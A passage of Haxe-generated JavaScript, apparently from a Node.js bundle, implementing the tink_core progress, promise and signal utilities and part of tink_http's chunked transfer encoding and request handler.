	return this1.a;
};
tink_core_ProgressValue.get_total = function(this1) {
	return this1.b;
};
var tink_core_Progress = {};
tink_core_Progress.listen = function(this1,cb) {
	return this1.progressed.listen(cb);
};
tink_core_Progress.handle = function(this1,cb) {
	return this1.result.handle(cb);
};
tink_core_Progress.trigger = function() {
	return new tink_core_ProgressTrigger();
};
tink_core_Progress.make = function(f) {
	return new tink_core__$Progress_SuspendableProgress(function(fire) {
		return f(function(value,total) {
			var fire1 = fire;
			var this1 = new tink_core_MPair(value,total);
			var this2 = this1;
			fire1(tink_core_ProgressStatus.InProgress(this2));
		},function(result) {
			fire(tink_core_ProgressStatus.Finished(result));
		});
	});
};
tink_core_Progress.map = function(this1,f) {
	return new tink_core__$Progress_ProgressObject(tink_core_Signal.map(this1.changed,function(s) {
		return tink_core_ProgressStatusTools.map(s,f);
	}),function() {
		return tink_core_ProgressStatusTools.map(this1.getStatus(),f);
	});
};
tink_core_Progress.asFuture = function(this1) {
	return this1.result;
};
tink_core_Progress.promise = function(v) {
	return new tink_core__$Progress_SuspendableProgress(function(fire) {
		var inner = new tink_core_CallbackLinkRef();
		return new tink_core__$Callback_LinkPair(v.handle(function(o) {
			switch(o._hx_index) {
			case 0:
				var p = o.data;
				var this1 = p.changed.listen(function(s) {
					fire(tink_core_ProgressStatusTools.map(s,tink_core_Outcome.Success));
				});
				inner.link = this1;
				break;
			case 1:
				var e = o.failure;
				fire(tink_core_ProgressStatus.Finished(tink_core_Outcome.Failure(e)));
				break;
			}
		}),inner);
	});
};
tink_core_Progress.flatten = function(v) {
	return tink_core_Progress.map(tink_core_Progress.promise(v),function(o) {
		switch(o._hx_index) {
		case 0:
			var _g = o.data;
			switch(_g._hx_index) {
			case 0:
				var v = _g.data;
				return tink_core_Outcome.Success(v);
			case 1:
				var e = _g.failure;
				return tink_core_Outcome.Failure(e);
			}
			break;
		case 1:
			var e = o.failure;
			return tink_core_Outcome.Failure(e);
		}
	});
};
tink_core_Progress.future = function(v) {
	return new tink_core__$Progress_SuspendableProgress(function(fire) {
		var inner = new tink_core_CallbackLinkRef();
		return new tink_core__$Callback_LinkPair(v.handle(function(p) {
			var this1 = p.changed.listen(fire);
			inner.link = this1;
		}),inner);
	});
};
tink_core_Progress.next = function(this1,f) {
	return tink_core_Future.flatMap(this1.result,f);
};
var tink_core__$Progress_ProgressObject = function(changed,getStatus) {
	this.changed = changed;
	var this1 = new tink_core__$Signal_Suspendable(function(fire) {
		return changed.listen(function(s) {
			if(s._hx_index == 0) {
				var v = s.v;
				fire(v);
			}
		});
	},null);
	this.progressed = this1;
	this.getStatus = getStatus;
	var this1 = new tink_core__$Future_SuspendableFuture(function(fire) {
		var _g = getStatus();
		if(_g._hx_index == 1) {
			var v = _g.v;
			fire(v);
			return null;
		} else {
			return changed.listen(function(s) {
				if(s._hx_index == 1) {
					var v = s.v;
					fire(v);
				}
			});
		}
	});
	this.result = this1;
};
tink_core__$Progress_ProgressObject.__name__ = true;
tink_core__$Progress_ProgressObject.prototype = {
	get_status: function() {
		return this.getStatus();
	}
	,__class__: tink_core__$Progress_ProgressObject
};
var tink_core__$Progress_SuspendableProgress = function(wakeup,status) {
	if(status == null) {
		status = tink_core_ProgressStatus.InProgress(tink_core_ProgressValue.ZERO);
	}
	var disposable = tink_core_AlreadyDisposed.INST;
	var changed;
	switch(status._hx_index) {
	case 0:
		var _g = status.v;
		var this1 = new tink_core__$Signal_Suspendable(function(fire) {
			return wakeup(function(s) {
				status = s;
				fire(status);
			});
		},function(d) {
			disposable = d;
		});
		changed = this1;
		break;
	case 1:
		var _g = status.v;
		changed = tink_core_Signal.dead();
		break;
	}
	tink_core__$Progress_ProgressObject.call(this,changed,function() {
		return status;
	});
};
tink_core__$Progress_SuspendableProgress.__name__ = true;
tink_core__$Progress_SuspendableProgress.__super__ = tink_core__$Progress_ProgressObject;
tink_core__$Progress_SuspendableProgress.prototype = $extend(tink_core__$Progress_ProgressObject.prototype,{
	noop: function(_,_1) {
		return null;
	}
	,__class__: tink_core__$Progress_SuspendableProgress
});
var tink_core_ProgressTrigger = function(status) {
	this._changed = null;
	var _gthis = this;
	if(status == null) {
		status = tink_core_ProgressStatus.InProgress(tink_core_ProgressValue.ZERO);
		this._status = status;
	}
	var tmp;
	if(status == null) {
		tmp = false;
	} else if(status._hx_index == 1) {
		var _g = status.v;
		tmp = true;
	} else {
		tmp = false;
	}
	tink_core__$Progress_ProgressObject.call(this,tmp ? tink_core_Signal.dead() : this._changed = tink_core_Signal.trigger(),function() {
		return _gthis._status;
	});
};
tink_core_ProgressTrigger.__name__ = true;
tink_core_ProgressTrigger.__super__ = tink_core__$Progress_ProgressObject;
tink_core_ProgressTrigger.prototype = $extend(tink_core__$Progress_ProgressObject.prototype,{
	asProgress: function() {
		return this;
	}
	,progress: function(v,total) {
		var _g = this._status;
		var tmp;
		if(_g._hx_index == 1) {
			var _g1 = _g.v;
			tmp = true;
		} else {
			tmp = false;
		}
		if(!tmp) {
			var _this = this._changed;
			var this1 = new tink_core_MPair(v,total);
			var this2 = this1;
			_this.handlers.invoke(this._status = tink_core_ProgressStatus.InProgress(this2));
		}
	}
	,finish: function(v) {
		var _g = this._status;
		var tmp;
		if(_g._hx_index == 1) {
			var _g1 = _g.v;
			tmp = true;
		} else {
			tmp = false;
		}
		if(!tmp) {
			this._changed.handlers.invoke(this._status = tink_core_ProgressStatus.Finished(v));
		}
	}
	,__class__: tink_core_ProgressTrigger
});
var tink_core_UnitInterval = {};
tink_core_UnitInterval.toPercentageString = function(this1,dp) {
	var m = Math.pow(10,dp);
	var v = Math.round(this1 * m * 100) / m;
	var s = v == null ? "null" : "" + v;
	var _g = s.indexOf(".");
	if(_g == -1) {
		return s + "." + StringTools.lpad("","0",dp) + "%";
	} else {
		var i = _g;
		if(s.length - i > dp) {
			return HxOverrides.substr(s,0,dp + i + 1) + "%";
		} else {
			var i = _g;
			return StringTools.rpad(s,"0",i + dp + 1) + "%";
		}
	}
};
var tink_core_ProgressStatus = $hxEnums["tink.core.ProgressStatus"] = { __ename__:true,__constructs__:null
	,InProgress: ($_=function(v) { return {_hx_index:0,v:v,__enum__:"tink.core.ProgressStatus",toString:$estr}; },$_._hx_name="InProgress",$_.__params__ = ["v"],$_)
	,Finished: ($_=function(v) { return {_hx_index:1,v:v,__enum__:"tink.core.ProgressStatus",toString:$estr}; },$_._hx_name="Finished",$_.__params__ = ["v"],$_)
};
tink_core_ProgressStatus.__constructs__ = [tink_core_ProgressStatus.InProgress,tink_core_ProgressStatus.Finished];
var tink_core_ProgressStatusTools = function() { };
tink_core_ProgressStatusTools.__name__ = true;
tink_core_ProgressStatusTools.map = function(p,f) {
	switch(p._hx_index) {
	case 0:
		var v = p.v;
		return tink_core_ProgressStatus.InProgress(v);
	case 1:
		var v = p.v;
		return tink_core_ProgressStatus.Finished(f(v));
	}
};
var tink_core_TotalTools = function() { };
tink_core_TotalTools.__name__ = true;
tink_core_TotalTools.eq = function(a,b) {
	switch(a._hx_index) {
	case 0:
		if(b._hx_index == 0) {
			var t2 = b.v;
			var t1 = a.v;
			return t1 == t2;
		} else {
			return false;
		}
		break;
	case 1:
		if(b._hx_index == 1) {
			return true;
		} else {
			return false;
		}
		break;
	}
};
var tink_core_ProgressTools = function() { };
tink_core_ProgressTools.__name__ = true;
tink_core_ProgressTools.asPromise = function(p) {
	return p.result;
};
var tink_core_Promise = {};
tink_core_Promise._new = function(f) {
	var this1 = new tink_core__$Future_SuspendableFuture(function(cb) {
		return f(function(v) {
			cb(tink_core_Outcome.Success(v));
		},function(e) {
			cb(tink_core_Outcome.Failure(e));
		});
	});
	var this2 = this1;
	return this2;
};
tink_core_Promise.eager = function(this1) {
	this1.eager();
	return this1;
};
tink_core_Promise.map = function(this1,f) {
	return tink_core_Future.map(this1,f);
};
tink_core_Promise.flatMap = function(this1,f) {
	return tink_core_Future.flatMap(this1,f);
};
tink_core_Promise.tryRecover = function(this1,f) {
	return tink_core_Future.flatMap(this1,function(o) {
		switch(o._hx_index) {
		case 0:
			var d = o.data;
			return new tink_core__$Future_SyncFuture(new tink_core__$Lazy_LazyConst(o));
		case 1:
			var e = o.failure;
			return f(e);
		}
	});
};
tink_core_Promise.recover = function(this1,f) {
	return tink_core_Future.flatMap(this1,function(o) {
		switch(o._hx_index) {
		case 0:
			var d = o.data;
			return new tink_core__$Future_SyncFuture(new tink_core__$Lazy_LazyConst(d));
		case 1:
			var e = o.failure;
			return f(e);
		}
	});
};
tink_core_Promise.mapError = function(this1,f) {
	return tink_core_Future.map(this1,function(o) {
		switch(o._hx_index) {
		case 0:
			var _g = o.data;
			return o;
		case 1:
			var e = o.failure;
			return tink_core_Outcome.Failure(f(e));
		}
	});
};
tink_core_Promise.handle = function(this1,cb) {
	return this1.handle(cb);
};
tink_core_Promise.noise = function(this1) {
	if(this1.getStatus()._hx_index == 4) {
		return tink_core_Promise.NEVER;
	} else {
		return tink_core_Promise.next(this1,function(v) {
			return new tink_core__$Future_SyncFuture(new tink_core__$Lazy_LazyConst(tink_core_Outcome.Success(null)));
		});
	}
};
tink_core_Promise.isSuccess = function(this1) {
	return tink_core_Future.map(this1,function(o) {
		return tink_core_OutcomeTools.isSuccess(o);
	});
};
tink_core_Promise.next = function(this1,f,gather) {
	return tink_core_Future.flatMap(this1,function(o) {
		switch(o._hx_index) {
		case 0:
			var d = o.data;
			return f(d);
		case 1:
			var f1 = o.failure;
			return new tink_core__$Future_SyncFuture(new tink_core__$Lazy_LazyConst(tink_core_Outcome.Failure(f1)));
		}
	});
};
tink_core_Promise.swap = function(this1,v) {
	return tink_core_Promise.next(this1,function(_) {
		return new tink_core__$Future_SyncFuture(new tink_core__$Lazy_LazyConst(tink_core_Outcome.Success(v)));
	});
};
tink_core_Promise.swapError = function(this1,e) {
	return tink_core_Promise.mapError(this1,function(_) {
		return e;
	});
};
tink_core_Promise.merge = function(this1,other,merger,gather) {
	return tink_core_Future.flatMap(tink_core_Future.merge(this1,other,function(a,b) {
		switch(a._hx_index) {
		case 0:
			var _g = a.data;
			switch(b._hx_index) {
			case 0:
				var b1 = b.data;
				var a1 = _g;
				return merger(a1,b1);
			case 1:
				var e = b.failure;
				return new tink_core__$Future_SyncFuture(new tink_core__$Lazy_LazyConst(tink_core_Outcome.Failure(e)));
			}
			break;
		case 1:
			var e = a.failure;
			return new tink_core__$Future_SyncFuture(new tink_core__$Lazy_LazyConst(tink_core_Outcome.Failure(e)));
		}
	}),function(o) {
		return o;
	});
};
tink_core_Promise.and = function(a,b) {
	return tink_core_Promise.merge(a,b,function(a,b) {
		var this1 = new tink_core_MPair(a,b);
		return new tink_core__$Future_SyncFuture(new tink_core__$Lazy_LazyConst(tink_core_Outcome.Success(this1)));
	});
};
tink_core_Promise.iterate = function(promises,$yield,fallback) {
	return tink_core_Future.irreversible(function(cb) {
		var iter = $getIterator(promises);
		var next = null;
		next = function() {
			if(iter.hasNext()) {
				iter.next().handle(function(o) {
					switch(o._hx_index) {
					case 0:
						var v = o.data;
						$yield(v).handle(function(o) {
							switch(o._hx_index) {
							case 0:
								var _g = o.data;
								switch(_g._hx_index) {
								case 0:
									var ret = _g.v;
									cb(tink_core_Outcome.Success(ret));
									break;
								case 1:
									next();
									break;
								}
								break;
							case 1:
								var e = o.failure;
								cb(tink_core_Outcome.Failure(e));
								break;
							}
						});
						break;
					case 1:
						var e = o.failure;
						cb(tink_core_Outcome.Failure(e));
						break;
					}
				});
			} else {
				fallback.handle(cb);
			}
		};
		next();
	});
};
tink_core_Promise.retry = function(gen,next) {
	var stamp = function() {
		var hrtime = process.hrtime();
		return (hrtime[0] + hrtime[1] / 1e9) * 1000;
	};
	var start = stamp();
	var attempt = null;
	attempt = function(count) {
		var f = function(error) {
			return tink_core_Promise.next(next({ attempt : count, error : error, elapsed : stamp() - start}),function(_) {
				return attempt(count + 1);
			});
		};
		return tink_core_Future.flatMap(gen(),function(o) {
			switch(o._hx_index) {
			case 0:
				var d = o.data;
				return new tink_core__$Future_SyncFuture(new tink_core__$Lazy_LazyConst(o));
			case 1:
				var e = o.failure;
				return f(e);
			}
		});
	};
	return attempt(1);
};
tink_core_Promise.ofJsPromise = function(promise) {
	return tink_core_Future.ofJsPromise(promise);
};
tink_core_Promise.toJsPromise = function(this1) {
	return new Promise(function(resolve,reject) {
		this1.handle(function(o) {
			switch(o._hx_index) {
			case 0:
				var v = o.data;
				resolve(v);
				break;
			case 1:
				var e = o.failure;
				reject(e.toJsError());
				break;
			}
		});
	});
};
tink_core_Promise.ofSpecific = function(s) {
	return s;
};
tink_core_Promise.fromNever = function(l) {
	return l;
};
tink_core_Promise.ofTrigger = function(f) {
	return f;
};
tink_core_Promise.ofHappyTrigger = function(f) {
	return tink_core_Future.map(f,tink_core_Outcome.Success);
};
tink_core_Promise.ofFuture = function(f) {
	return tink_core_Future.map(f,tink_core_Outcome.Success);
};
tink_core_Promise.ofOutcome = function(o) {
	return new tink_core__$Future_SyncFuture(new tink_core__$Lazy_LazyConst(o));
};
tink_core_Promise.ofError = function(e) {
	return new tink_core__$Future_SyncFuture(new tink_core__$Lazy_LazyConst(tink_core_Outcome.Failure(e)));
};
tink_core_Promise.ofData = function(d) {
	return new tink_core__$Future_SyncFuture(new tink_core__$Lazy_LazyConst(tink_core_Outcome.Success(d)));
};
tink_core_Promise.lazy = function(p) {
	var this1 = new tink_core__$Future_SuspendableFuture(function(cb) {
		return tink_core_Lazy.get(p).handle(cb);
	});
	return this1;
};
tink_core_Promise.inParallel = function(a,concurrency) {
	return tink_core_Promise.many(a,concurrency);
};
tink_core_Promise.many = function(a,concurrency) {
	return tink_core_Future.processMany(a,concurrency,function(o) {
		return o;
	},function(o) {
		return o;
	});
};
tink_core_Promise.inSequence = function(a) {
	return tink_core_Promise.many(a,1);
};
tink_core_Promise.cache = function(gen) {
	var p = null;
	return function() {
		var ret = p;
		if(ret == null) {
			var sync = false;
			ret = tink_core_Promise.next(gen(),function(o) {
				o.b.handle(function(_) {
					sync = true;
					p = null;
				});
				return new tink_core__$Future_SyncFuture(new tink_core__$Lazy_LazyConst(tink_core_Outcome.Success(o.a)));
			});
			if(!sync) {
				p = ret;
			}
		}
		return tink_core_Future.map(ret,function(o) {
			if(!tink_core_OutcomeTools.isSuccess(o)) {
				p = null;
			}
			return o;
		});
	};
};
tink_core_Promise.lift = function(p) {
	return p;
};
tink_core_Promise.trigger = function() {
	var this1 = new tink_core_FutureTrigger();
	return this1;
};
tink_core_Promise.resolve = function(v) {
	return new tink_core__$Future_SyncFuture(new tink_core__$Lazy_LazyConst(tink_core_Outcome.Success(v)));
};
tink_core_Promise.reject = function(e) {
	return new tink_core__$Future_SyncFuture(new tink_core__$Lazy_LazyConst(tink_core_Outcome.Failure(e)));
};
var tink_core_Next = {};
tink_core_Next.ofSafe = function(f) {
	return function(x) {
		return new tink_core__$Future_SyncFuture(new tink_core__$Lazy_LazyConst(f(x)));
	};
};
tink_core_Next.ofSync = function(f) {
	return function(x) {
		return tink_core_Future.map(f(x),tink_core_Outcome.Success);
	};
};
tink_core_Next.ofSafeSync = function(f) {
	return function(x) {
		return new tink_core__$Future_SyncFuture(new tink_core__$Lazy_LazyConst(tink_core_Outcome.Success(f(x))));
	};
};
tink_core_Next._chain = function(a,b) {
	return function(v) {
		return tink_core_Promise.next(a(v),b);
	};
};
var tink_core_Recover = {};
tink_core_Recover.ofSync = function(f) {
	return function(e) {
		return new tink_core__$Future_SyncFuture(new tink_core__$Lazy_LazyConst(f(e)));
	};
};
var tink_core_Combiner = {};
tink_core_Combiner.ofSync = function(f) {
	return function(x1,x2) {
		return new tink_core__$Future_SyncFuture(new tink_core__$Lazy_LazyConst(f(x1,x2)));
	};
};
tink_core_Combiner.ofSafe = function(f) {
	return function(x1,x2) {
		return tink_core_Future.map(f(x1,x2),tink_core_Outcome.Success);
	};
};
tink_core_Combiner.ofSafeSync = function(f) {
	return function(x1,x2) {
		return new tink_core__$Future_SyncFuture(new tink_core__$Lazy_LazyConst(tink_core_Outcome.Success(f(x1,x2))));
	};
};
var tink_core_PromiseTrigger = {};
tink_core_PromiseTrigger._new = function() {
	var this1 = new tink_core_FutureTrigger();
	return this1;
};
tink_core_PromiseTrigger.resolve = function(this1,v) {
	return this1.trigger(tink_core_Outcome.Success(v));
};
tink_core_PromiseTrigger.reject = function(this1,e) {
	return this1.trigger(tink_core_Outcome.Failure(e));
};
tink_core_PromiseTrigger.asPromise = function(this1) {
	return this1;
};
var tink_core_Ref = {};
tink_core_Ref._new = function() {
	var this1 = new Array(1);
	var this2 = this1;
	return this2;
};
tink_core_Ref.get_value = function(this1) {
	return this1[0];
};
tink_core_Ref.set_value = function(this1,param) {
	return this1[0] = param;
};
tink_core_Ref.toString = function(this1) {
	return "@[" + Std.string(this1[0]) + "]";
};
tink_core_Ref.to = function(v) {
	var this1 = new Array(1);
	var this2 = this1;
	var ret = this2;
	ret[0] = v;
	return ret;
};
var tink_core_Gather = {};
tink_core_Gather._new = function(v) {
	var this1 = v;
	return this1;
};
tink_core_Gather.ofBool = function(b) {
	var this1 = b;
	return this1;
};
var tink_core_Signal = {};
tink_core_Signal._new = function(f,init) {
	var this1 = new tink_core__$Signal_Suspendable(f,init);
	return this1;
};
tink_core_Signal.handle = function(this1,handler) {
	return this1.listen(handler);
};
tink_core_Signal.map = function(this1,f,gather) {
	return tink_core__$Signal_Suspendable.over(this1,function(fire) {
		return this1.listen(function(v) {
			fire(f(v));
		});
	});
};
tink_core_Signal.flatMap = function(this1,f,gather) {
	return tink_core__$Signal_Suspendable.over(this1,function(fire) {
		return this1.listen(function(v) {
			f(v).handle(fire);
		});
	});
};
tink_core_Signal.filter = function(this1,f,gather) {
	return tink_core__$Signal_Suspendable.over(this1,function(fire) {
		return this1.listen(function(v) {
			if(f(v)) {
				fire(v);
			}
		});
	});
};
tink_core_Signal.select = function(this1,selector,gather) {
	return tink_core__$Signal_Suspendable.over(this1,function(fire) {
		return this1.listen(function(v) {
			var _g = selector(v);
			if(_g._hx_index == 0) {
				var v = _g.v;
				fire(v);
			}
		});
	});
};
tink_core_Signal.join = function(this1,that,gather) {
	if(this1.get_disposed()) {
		return that;
	} else if(that.get_disposed()) {
		return this1;
	} else {
		return new tink_core__$Signal_Suspendable(function(fire) {
			var cb = fire;
			return new tink_core__$Callback_LinkPair(this1.listen(cb),that.listen(cb));
		},function(self) {
			var release = function() {
				if(this1.get_disposed() && that.get_disposed()) {
					self.dispose();
				}
			};
			this1.ondispose(release);
			that.ondispose(release);
		});
	}
};
tink_core_Signal.nextTime = function(this1,condition) {
	return tink_core_Signal.pickNext(this1,function(v) {
		if(condition == null || condition(v)) {
			return haxe_ds_Option.Some(v);
		} else {
			return haxe_ds_Option.None;
		}
	});
};
tink_core_Signal.pickNext = function(this1,selector) {
	var ret = new tink_core_FutureTrigger();
	var link = null;
	link = this1.listen(function(v) {
		var _g = selector(v);
		switch(_g._hx_index) {
		case 0:
			var v = _g.v;
			ret.trigger(v);
			break;
		case 1:
			break;
		}
	});
	ret.handle(link == null ? tink_core_CallbackLink.noop : ($_=link,$bind($_,$_.cancel)));
	return ret;
};
tink_core_Signal.until = function(this1,end) {
	return new tink_core__$Signal_Suspendable(function($yield) {
		return this1.listen($yield);
	},function(self) {
		end.handle($bind(self,self.dispose));
	});
};
tink_core_Signal.next = function(this1,condition) {
	return tink_core_Signal.nextTime(this1,condition);
};
tink_core_Signal.noise = function(this1) {
	return tink_core_Signal.map(this1,function(_) {
		return null;
	});
};
tink_core_Signal.gather = function(this1) {
	return this1;
};
tink_core_Signal.create = function(f) {
	var this1 = new tink_core__$Signal_Suspendable(f,null);
	return this1;
};
tink_core_Signal.generate = function(generator,init) {
	var this1 = new tink_core__$Signal_Suspendable(function(fire) {
		generator(fire);
		return null;
	},init);
	return this1;
};
tink_core_Signal.trigger = function() {
	return new tink_core_SignalTrigger();
};
tink_core_Signal.ofClassical = function(add,remove,gather) {
	return new tink_core__$Signal_Suspendable(function(fire) {
		add(fire);
		var _g = remove;
		var a1 = fire;
		var this1 = new tink_core_SimpleLink(function() {
			_g(a1);
		});
		return this1;
	});
};
tink_core_Signal.dead = function() {
	return tink_core__$Signal_Disposed.INST;
};
var tink_core__$Signal_SignalObject = function() { };
tink_core__$Signal_SignalObject.__name__ = true;
tink_core__$Signal_SignalObject.__isInterface__ = true;
tink_core__$Signal_SignalObject.__interfaces__ = [tink_core_Disposable];
tink_core__$Signal_SignalObject.prototype = {
	__class__: tink_core__$Signal_SignalObject
};
var tink_core__$Signal_Disposed = function() {
	tink_core_AlreadyDisposed.call(this);
};
tink_core__$Signal_Disposed.__name__ = true;
tink_core__$Signal_Disposed.__interfaces__ = [tink_core__$Signal_SignalObject];
tink_core__$Signal_Disposed.__super__ = tink_core_AlreadyDisposed;
tink_core__$Signal_Disposed.prototype = $extend(tink_core_AlreadyDisposed.prototype,{
	listen: function(cb) {
		return null;
	}
	,__class__: tink_core__$Signal_Disposed
});
var tink_core__$Signal_Suspendable = function(activate,init) {
	this.handlers = new tink_core_CallbackList();
	var _gthis = this;
	this.activate = activate;
	this.init = init;
	this.handlers.ondrain = function() {
		var this1 = _gthis.subscription;
		if(this1 != null) {
			this1.cancel();
		}
	};
	this.handlers.onfill = function() {
		if(init != null) {
			var f = init;
			init = null;
			f(_gthis);
		}
		_gthis.subscription = activate(($_=_gthis.handlers,$bind($_,$_.invoke)));
	};
};
tink_core__$Signal_Suspendable.__name__ = true;
tink_core__$Signal_Suspendable.__interfaces__ = [tink_core_OwnedDisposable,tink_core__$Signal_SignalObject];
tink_core__$Signal_Suspendable.over = function(s,activate) {
	if(s.get_disposed()) {
		return tink_core_Signal.dead();
	} else {
		var ret = new tink_core__$Signal_Suspendable(activate);
		s.ondispose($bind(ret,ret.dispose));
		return ret;
	}
};
tink_core__$Signal_Suspendable.prototype = {
	get_disposed: function() {
		return this.handlers.disposeHandlers == null;
	}
	,dispose: function() {
		this.handlers.dispose();
	}
	,ondispose: function(handler) {
		this.handlers.ondispose(handler);
	}
	,listen: function(cb) {
		var _this = this.handlers;
		if(_this.disposeHandlers == null) {
			return null;
		} else {
			var node = new tink_core__$Callback_ListCell(cb,_this);
			_this.cells.push(node);
			if(_this.used++ == 0) {
				var fn = _this.onfill;
				if(tink_core_Callback.depth < 500) {
					tink_core_Callback.depth++;
					fn();
					tink_core_Callback.depth--;
				} else {
					tink_core_Callback.defer(fn);
				}
			}
			return node;
		}
	}
	,__class__: tink_core__$Signal_Suspendable
};
var tink_core_SignalTrigger = function() {
	this.handlers = new tink_core_CallbackList();
};
tink_core_SignalTrigger.__name__ = true;
tink_core_SignalTrigger.__interfaces__ = [tink_core_OwnedDisposable,tink_core__$Signal_SignalObject];
tink_core_SignalTrigger.prototype = {
	get_disposed: function() {
		return this.handlers.disposeHandlers == null;
	}
	,dispose: function() {
		this.handlers.dispose();
	}
	,ondispose: function(d) {
		this.handlers.ondispose(d);
	}
	,trigger: function(event) {
		this.handlers.invoke(event);
	}
	,getLength: function() {
		return this.handlers.used;
	}
	,listen: function(cb) {
		var _this = this.handlers;
		if(_this.disposeHandlers == null) {
			return null;
		} else {
			var node = new tink_core__$Callback_ListCell(cb,_this);
			_this.cells.push(node);
			if(_this.used++ == 0) {
				var fn = _this.onfill;
				if(tink_core_Callback.depth < 500) {
					tink_core_Callback.depth++;
					fn();
					tink_core_Callback.depth--;
				} else {
					tink_core_Callback.defer(fn);
				}
			}
			return node;
		}
	}
	,clear: function() {
		this.handlers.clear();
	}
	,asSignal: function() {
		return this;
	}
	,__class__: tink_core_SignalTrigger
};
var tink_http_Chunked = function() { };
tink_http_Chunked.__name__ = true;
tink_http_Chunked.encoder = function() {
	if(tink_http_Chunked._encoder == null) {
		tink_http_Chunked._encoder = new tink_http_ChunkedEncoder();
	}
	return tink_http_Chunked._encoder;
};
tink_http_Chunked.decoder = function() {
	if(tink_http_Chunked._decoder == null) {
		tink_http_Chunked._decoder = new tink_http_ChunkedDecoder();
	}
	return tink_http_Chunked._decoder;
};
tink_http_Chunked.encode = function(source) {
	return tink_http_Chunked.encoder().transform(source);
};
tink_http_Chunked.decode = function(source) {
	return tink_http_Chunked.decoder().transform(source);
};
var tink_io_Transformer = function() { };
tink_io_Transformer.__name__ = true;
tink_io_Transformer.__isInterface__ = true;
tink_io_Transformer.prototype = {
	__class__: tink_io_Transformer
};
var tink_http_ChunkedEncoder = function() {
};
tink_http_ChunkedEncoder.__name__ = true;
tink_http_ChunkedEncoder.__interfaces__ = [tink_io_Transformer];
tink_http_ChunkedEncoder.prototype = {
	transform: function(source) {
		return tink_io_Source.chunked(source).map(tink_streams_Mapping.ofPlain(function(chunk) {
			return tink_Chunk.concat(tink_Chunk.concat(tink_chunk_ByteChunk.of(haxe_io_Bytes.ofString("" + StringTools.hex(chunk.getLength()) + "\r\n")),chunk),tink_chunk_ByteChunk.of(haxe_io_Bytes.ofString("\r\n")));
		})).append(tink_streams_Stream.ofIterator(new haxe_iterators_ArrayIterator([tink_chunk_ByteChunk.of(haxe_io_Bytes.ofString("0\r\n"))])));
	}
	,__class__: tink_http_ChunkedEncoder
};
var tink_http_ChunkedDecoder = function() {
};
tink_http_ChunkedDecoder.__name__ = true;
tink_http_ChunkedDecoder.__interfaces__ = [tink_io_Transformer];
tink_http_ChunkedDecoder.prototype = {
	transform: function(source) {
		return tink_io_RealSourceTools.parseStream(source,new tink_http_ChunkedParser()).map(tink_streams_Mapping.ofPlain(function(v) {
			if(v == null) {
				return tink_Chunk.EMPTY;
			} else {
				return v;
			}
		}));
	}
	,__class__: tink_http_ChunkedDecoder
};
var tink_io_StreamParserObject = function() { };
tink_io_StreamParserObject.__name__ = true;
tink_io_StreamParserObject.__isInterface__ = true;
tink_io_StreamParserObject.prototype = {
	__class__: tink_io_StreamParserObject
};
var tink_http_ChunkedParser = function() {
	this.reset();
};
tink_http_ChunkedParser.__name__ = true;
tink_http_ChunkedParser.__interfaces__ = [tink_io_StreamParserObject];
tink_http_ChunkedParser.prototype = {
	reset: function() {
		this.chunkSize = -1;
	}
	,progress: function(cursor) {
		if(this.chunkSize < 0) {
			var _g = cursor.seek(tink_http_ChunkedParser.LINEBREAK);
			switch(_g._hx_index) {
			case 0:
				var v = _g.v;
				this.chunkSize = Std.parseInt("0x" + (v == null ? "null" : v.toString()));
				break;
			case 1:
				break;
			}
			return tink_io_ParseStep.Progressed;
		} else if(this.chunkSize == 0) {
			return tink_io_ParseStep.Progressed;
		} else if(cursor.length >= this.chunkSize + 2) {
			var _g = cursor.seek(tink_http_ChunkedParser.LINEBREAK);
			switch(_g._hx_index) {
			case 0:
				var v = _g.v;
				this.reset();
				return tink_io_ParseStep.Done(v);
			case 1:
				return tink_io_ParseStep.Failed(new tink_core_TypedError(null,"Invalid encoding",{ fileName : "tink/http/Chunked.hx", lineNumber : 82, className : "tink.http.ChunkedParser", methodName : "progress"}));
			}
		} else {
			return tink_io_ParseStep.Progressed;
		}
	}
	,eof: function(rest) {
		if(this.chunkSize == 0) {
			return tink_core_Outcome.Success(tink_Chunk.EMPTY);
		} else {
			return tink_core_Outcome.Failure(new tink_core_TypedError(null,"Unexpected end of input",{ fileName : "tink/http/Chunked.hx", lineNumber : 89, className : "tink.http.ChunkedParser", methodName : "eof"}));
		}
	}
	,__class__: tink_http_ChunkedParser
};
var tink_http_Container = function() { };
tink_http_Container.__name__ = true;
tink_http_Container.__isInterface__ = true;
tink_http_Container.prototype = {
	__class__: tink_http_Container
};
var tink_http_ContainerResult = $hxEnums["tink.http.ContainerResult"] = { __ename__:true,__constructs__:null
	,Running: ($_=function(running) { return {_hx_index:0,running:running,__enum__:"tink.http.ContainerResult",toString:$estr}; },$_._hx_name="Running",$_.__params__ = ["running"],$_)
	,Failed: ($_=function(e) { return {_hx_index:1,e:e,__enum__:"tink.http.ContainerResult",toString:$estr}; },$_._hx_name="Failed",$_.__params__ = ["e"],$_)
	,Shutdown: {_hx_name:"Shutdown",_hx_index:2,__enum__:"tink.http.ContainerResult",toString:$estr}
};
tink_http_ContainerResult.__constructs__ = [tink_http_ContainerResult.Running,tink_http_ContainerResult.Failed,tink_http_ContainerResult.Shutdown];
var tink_http_Handler = {};
tink_http_Handler.ofFunc = function(f) {
	return new tink_http_SimpleHandler(f);
};
tink_http_Handler.toNodeHandler = function(this1,options) {
	var body = options == null ? function(msg) {
		var options = null;
		if(options == null) {
			options = { };
		}
		return tink_http_IncomingRequestBody.Plain(tink_io_nodejs_NodejsSource.wrap("Incoming HTTP message from " + msg.socket.remoteAddress,msg,options.chunkSize,options.onEnd));
	} : options.body == null ? function(msg) {
		var options = null;
		if(options == null) {
			options = { };
		}
		return tink_http_IncomingRequestBody.Plain(tink_io_nodejs_NodejsSource.wrap("Incoming HTTP message from " + msg.socket.remoteAddress,msg,options.chunkSize,options.onEnd));
	} : options.body;
	return function(req,res) {
		this1.process(new tink_http_IncomingRequest(req.socket.remoteAddress,tink_http_IncomingRequestHeader.fromIncomingMessage(req),body(req))).handle(function(out) {
			var headers_h = Object.create(null);
			var _g1_current = 0;
			var _g1_array = out.header.fields;
			while(_g1_current < _g1_array.length) {
				var h = _g1_array[_g1_current++];
				if(!Object.prototype.hasOwnProperty.call(headers_h,h.name)) {
					var v = [];
					headers_h[h.name] = v;
				}
				headers_h[h.name].push(h.value);
			}
			var name = new haxe_ds__$StringMap_StringMapKeyIterator(headers_h);
			while(name.hasNext()) {
				var name1 = name.next();
				res.setHeader(name1,headers_h[name1]);
			}
			res.writeHead(out.header.statusCode,out.header.reason);
